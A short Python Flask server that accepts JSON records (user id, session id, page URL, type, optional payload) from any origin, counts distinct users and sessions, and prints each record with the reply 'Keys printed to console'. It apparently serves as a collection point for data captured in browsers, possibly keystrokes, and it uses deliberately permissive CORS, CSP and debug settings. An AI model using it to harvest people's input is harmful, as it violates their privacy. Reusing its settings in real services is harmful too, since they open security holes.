import json
from flask import Flask, request, jsonify
from flask_cors import CORS
import logging

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)  # Only log errors, ignore regular requests

app = Flask(__name__)

CORS(app, supports_credentials=True, origins="*", allow_headers="*", methods="*")

@app.after_request
def add_csp_headers(response):
    response.headers["Content-Security-Policy"] = "default-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src *;"
    return response

t = 0
users = set()
sessions = set()

@app.route('/endpoint', methods=['POST'])
def endpoint():
    global t
    global users
    global sessions
    data =  request.data
    try:
        data = json.loads(data)
    except ValueError:
        return jsonify({"error": "Invalid JSON data received"}), 400
    t = t + 1
    users.add(data['user_id'])
    sessions.add(data['session_id'])

    if data:
        if "payload" in data:
            print(f"{t:04}:{len(users)}:{len(sessions)} - {data['type']} - {data['url']} - {data['payload']}")
        else:
            print(f"{t:04}:{len(users)}:{len(sessions)} - {data['type']} - {data['url']}")
        return jsonify({"message": "Keys printed to console"}), 200
    else:
        return jsonify({"error": "No JSON data received"}), 400

if __name__ == '__main__':
    app.run(debug=True)